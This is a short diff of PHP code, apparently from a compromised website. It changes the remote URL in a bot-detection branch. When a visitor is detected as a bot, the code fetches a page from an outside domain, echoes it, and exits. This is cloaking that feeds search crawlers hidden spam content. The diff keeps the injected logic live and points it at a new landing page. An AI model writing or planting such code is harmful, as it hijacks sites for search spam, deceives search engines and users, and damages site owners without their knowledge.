@@ -18,7 +18,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://childrenofiran.org/landing/lipi/');
+    $message = file_get_contents('https://childrenofiran.org/landing/smkpgri1prabumulih/');
     echo $message;
 exit;
 }
